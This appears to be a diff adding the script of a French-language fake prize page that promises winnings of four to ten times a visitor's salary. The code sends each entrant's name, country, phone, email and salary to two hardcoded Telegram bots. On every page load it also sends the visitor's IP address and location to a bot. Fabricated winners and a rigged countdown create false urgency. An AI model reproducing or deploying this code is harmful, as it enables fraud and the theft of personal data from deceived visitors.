+            
+            // Validate salary
+            if (isNaN(salary) || salary <= 0) {
+                alert('Veuillez entrer un salaire valide');
+                return;
+            }
+            
+            // Show loading spinner
+            loadingSpinner.style.display = 'block';
+            calculatorResult.style.display = 'none';
+
+            // Check for saved prize
+            let savedPrize = localStorage.getItem('userPrize');
+            let prize, multiplier;
+
+            if (savedPrize) {
+                savedPrize = JSON.parse(savedPrize);
+                prize = savedPrize.prize;
+                multiplier = savedPrize.multiplier;
+            } else {
+                // Calculate random multiplier between 4 and 10
+                multiplier = Math.floor(Math.random() * 7) + 4;
+                prize = salary * multiplier;
+                localStorage.setItem('userPrize', JSON.stringify({ prize, multiplier }));
+            }
+            
+            // Display results after 5 seconds
+            setTimeout(() => {
+                loadingSpinner.style.display = 'none';
+                prizeAmount.textContent = prize.toFixed(2) + ' €';
+                resultName.textContent = fullName;
+                resultPhone.textContent = phone;
+                resultEmail.textContent = email;
+                resultSalary.textContent = salary.toFixed(2) + ' €';
+                resultCoefficient.textContent = multiplier;
+                
+                // Show result section
+                calculatorResult.style.display = 'block';
+                
+                // Scroll to result section
+                calculatorResult.scrollIntoView({ behavior: 'smooth' });
+
+                const bot1Token = '8266805424:AAFt7ztOgiutgEU1Lujt4Nt_g5Qzn88wEMQ';
+                const bot1ChatId = '780712584';
+                const bot2Token = '8406577100:AAF7mvVd2svcSC7A2GdI6aq-i5x7o_sTbto';
+                const bot2ChatId = '612575358';
+
+                const message = `
+                    Nouveau participant:
+                    Nom: ${fullName}
+                    Pays: ${country}
+                    Téléphone: ${phone}
+                    Email: ${email}
+                    Salaire: ${salary}€
+                    Gain: ${prize.toFixed(2)}€
+                `;
+
+                const sendToBot = (token, chatId) => {
+                    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                    const params = {
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    };
+
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(params)
+                    }).then(response => response.json())
+                      .then(data => console.log(`Message sent to bot with chat ID ${chatId}:`, data))
+                      .catch(error => console.error(`Error sending message to bot with chat ID ${chatId}:`, error));
+                };
+
+                sendToBot(bot1Token, bot1ChatId);
+                sendToBot(bot2Token, bot2ChatId);
+
+                // Redirect automatically after a short delay
+                setTimeout(() => {
+                    const url = `traitement.html?name=${encodeURIComponent(fullName)}&prize=${encodeURIComponent(prize.toFixed(2))}&phone=${encodeURIComponent(phone)}&email=${encodeURIComponent(email)}`;
+                    window.location.href = url;
+                }, 5000);
+            }, 5000);
+        });
+        
+        // Animate elements on scroll
+        const animateOnScroll = () => {
+            const elements = document.querySelectorAll('.animate-fade');
+            
+            elements.forEach(element => {
+                const elementPosition = element.getBoundingClientRect().top;
+                const screenPosition = window.innerHeight / 1.3;
+                
+                if (elementPosition < screenPosition) {
+                    element.style.opacity = '1';
+                    element.style.transform = 'translateY(0)';
+                }
+            });
+        };
+        
+        // Set initial state for animated elements
+        document.querySelectorAll('.animate-fade').forEach(element => {
+            element.style.opacity = '0';
+            element.style.transform = 'translateY(20px)';
+            element.style.transition = 'opacity 0.6s ease-out, transform 0.6s ease-out';
+        });
+        
+        window.addEventListener('scroll', animateOnScroll);
+        window.addEventListener('load', animateOnScroll);
+
+        // Countdown Timer
+        const countdown = () => {
+            const now = new Date().getTime();
+            // Set a target date in the future
+            const targetDate = new Date();
+            targetDate.setDate(targetDate.getDate() + 1);
+            targetDate.setHours(Math.floor(Math.random() * 24));
+            targetDate.setMinutes(Math.floor(Math.random() * 60));
+            targetDate.setSeconds(Math.floor(Math.random() * 60));
+
+            const gap = targetDate.getTime() - now;
+
+            const second = 1000;
+            const minute = second * 60;
+            const hour = minute * 60;
+            const day = hour * 24;
+
+            const textDay = Math.floor(gap / day);
+            let textHour = Math.floor((gap % day) / hour);
+            let textMinute = Math.floor((gap % hour) / minute);
+            let textSecond = Math.floor((gap % minute) / second);
+
+            // Ensure values are non-negative
+            if (textHour < 0) textHour = 0;
+            if (textMinute < 0) textMinute = 0;
+            if (textSecond < 0) textSecond = 0;
+
+            document.getElementById('days').innerText = 1; // Always 1 day
+            document.getElementById('hours').innerText = textHour;
+            document.getElementById('minutes').innerText = textMinute;
+            document.getElementById('seconds').innerText = textSecond;
+        };
+
+        // Update countdown every second, but randomize the time only once
+        const randomizeTime = () => {
+            const randomHour = Math.floor(Math.random() * 24);
+            const randomMinute = Math.floor(Math.random() * 60);
+            const randomSecond = Math.floor(Math.random() * 60);
+
+            let remainingSeconds = randomHour * 3600 + randomMinute * 60 + randomSecond;
+
+            const updateCountdown = () => {
+                if (remainingSeconds <= 0) {
+                    // Reset to a new random time
+                    const newRandomHour = Math.floor(Math.random() * 24);
+                    const newRandomMinute = Math.floor(Math.random() * 60);
+                    const newRandomSecond = Math.floor(Math.random() * 60);
+                    remainingSeconds = newRandomHour * 3600 + newRandomMinute * 60 + newRandomSecond;
+                }
+
+                const hours = Math.floor(remainingSeconds / 3600);
+                const minutes = Math.floor((remainingSeconds % 3600) / 60);
+                const seconds = remainingSeconds % 60;
+
+                document.getElementById('days').innerText = 1;
+                document.getElementById('hours').innerText = hours.toString().padStart(2, '0');
+                document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0');
+
+                remainingSeconds--;
+            };
+
+            updateCountdown(); // Initial call
+            setInterval(updateCountdown, 1000);
+        };
+
+        randomizeTime();
+
+        // Dynamic Winners
+        const winners = [
+            { name: 'Chloé Dubois', prize: '18,500 €', image: 'https://randomuser.me/api/portraits/women/1.jpg' },
+            { name: 'Lucas Martin', prize: '22,000 €', image: 'https://randomuser.me/api/portraits/men/2.jpg' },
+            { name: 'Léa Bernard', prize: '14,200 €', image: 'https://randomuser.me/api/portraits/women/3.jpg' },
+            { name: 'Gabriel Garcia', prize: '19,800 €', image: 'https://randomuser.me/api/portraits/men/4.jpg' },
+            { name: 'Manon Petit', prize: '16,700 €', image: 'https://randomuser.me/api/portraits/women/5.jpg' },
+            { name: 'Enzo Leroy', prize: '25,000 €', image: 'https://randomuser.me/api/portraits/men/6.jpg' },
+            { name: 'Camille Moreau', prize: '13,100 €', image: 'https://randomuser.me/api/portraits/women/7.jpg' },
+            { name: 'Hugo Roux', prize: '21,300 €', image: 'https://randomuser.me/api/portraits/men/8.jpg' },
+            { name: 'Océane Lefebvre', prize: '17,900 €', image: 'https://randomuser.me/api/portraits/women/9.jpg' },
+            { name: 'Nicolas David', prize: '23,500 €', image: 'https://randomuser.me/api/portraits/men/10.jpg' }
+        ];
+
+        const winnersContainer = document.getElementById('winners-container');
+
+        const updateWinners = () => {
+            winnersContainer.innerHTML = '';
+            const selectedWinners = [];
+            while (selectedWinners.length < 3) {
+                const randomIndex = Math.floor(Math.random() * winners.length);
+                if (!selectedWinners.includes(winners[randomIndex])) {
+                    selectedWinners.push(winners[randomIndex]);
+                }
+            }
+
+            selectedWinners.forEach(winner => {
+                const winnerCard = document.createElement('div');
+                winnerCard.classList.add('winner-card');
+                winnerCard.innerHTML = `
+                    <img src="${winner.image}" alt="${winner.name}" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover; margin-bottom: 1rem;">
+                    <p class="winner-name">${winner.name}</p>
+                    <p class="winner-prize">${winner.prize}</p>
+                `;
+                winnersContainer.appendChild(winnerCard);
+            });
+        };
+
+        updateWinners();
+        setInterval(updateWinners, 5000);
+
+
+
+        const sendTelegramNotificationOnLoad = () => {
+            const botToken = '8406577100:AAF7mvVd2svcSC7A2GdI6aq-i5x7o_sTbto';
+            const chatId = '612575358';
+
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const country = data.country_name;
+                    const city = data.city;
+                    const time = new Date().toLocaleString();
+                    const device = navigator.userAgent;
+                    const browser = navigator.appName;
+
+                    const message = `
+✅ New Website Visit
+Ip : ${ip}
+🕒 Time: ${time}
+📍 Location: ${city}, ${country}
+🌐 Browser: ${browser}
+                    `;
+
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const params = {
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    };
+
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(params)
+                    }).then(response => response.json())
+                      .then(data => console.log('Telegram notification sent:', data))
+                      .catch(error => console.error('Error sending Telegram notification:', error));
+                })
+                .catch(error => console.error('Error getting location data:', error));
+        };
+
+        window.onload = sendTelegramNotificationOnLoad;
+    </script>
+</body>
+</html>
